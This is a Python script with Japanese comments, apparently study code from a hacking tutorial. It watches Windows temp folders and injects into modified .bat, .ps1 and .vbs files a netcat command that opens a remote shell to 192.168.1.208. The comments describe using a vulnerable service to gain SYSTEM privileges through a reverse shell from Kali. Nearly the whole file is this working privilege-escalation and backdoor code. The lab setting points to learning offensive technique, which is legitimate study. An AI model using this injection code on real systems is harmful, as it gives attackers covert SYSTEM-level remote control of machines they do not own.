#コードインジェクション
#プロセスとファイルの場所を監視できるようになったので、対象のファイルに自動的にコードをインジェクションする
#２章で作成したnetcay.pyを元のサービスの権限で実行させる

#既に標的マシンに侵入した後を想定し。
#netcat.exeを入手
#脆弱性のあるbservice.pyの稼働を確認後に、file_monitor2.pyを実行。コードをインジェクションさせＳＹＳＴＥＭ権限でnetcat.exeを実行させる。
#kaliでアクセスし、リバースシェルによりＳＹＳＴＥＭ権限を取得

import os
import tempfile
import threading
import win32con
import win32file

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

FILE_LIST_DIRECTORY = 0x0001
PATHS = ['c:\\Windows\\Temp', tempfile.gettempdir()]

NETCAT = 'c:\\users\\IEUser\\work\\netcat.exe'
TGT_IP = '192.168.1.208'
CMD = f'""{NETCAT}"" -t {TGT_IP} -p 9999 -l -c '

#特定のファイル拡張子に対応する、コードスニペットの辞書を作成。固有のマーカーとインジェクションしたいコードを含む
FILE_TYPES = {
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
}

#実際のコードのインジェクションとファイルのマーカの確認を行う
def inject_code(full_filename, contents, extension):
    #マーカーがついていない事を確認した後
    if FILE_TYPES[extension][0].strip() in contents:
        return

    #マーカーと対象のプロセスに実行させたいコードを書き込む
    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Injected Code')


def monitor(path_to_watch):
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )

    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None
            )
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')

                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')

                #前回のコードの修正が必要
                #ファイルの拡張子を取り出し
                elif action == FILE_MODIFIED:
                    print(f'[*] Modified {full_filename}')
                    extension = os.path.splitext(full_filename)[1]
                    #コードをインジェクションする対象のファイルかどうかを確認
                    if extension in FILE_TYPES:
                        try:
                            with open(full_filename) as f:
                                contents = f.read()
                            print('[vvv] Dumping contents ... ')
                            inject_code(full_filename,
                                        contents, extension)
                            # print(contents)
                            print('[^^^] Dump complete.')
                        except Exception as e:
                            print(f'[!!!] Dump failed. {e}')

                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknown action on {full_filename}')
        except KeyboardInterrupt:
            break

        except Exception:
            pass


if __name__ == '__main__':
    for path in PATHS:
        monitor_thread = threading.Thread(
            target=monitor, args=(path,))
        monitor_thread.start()
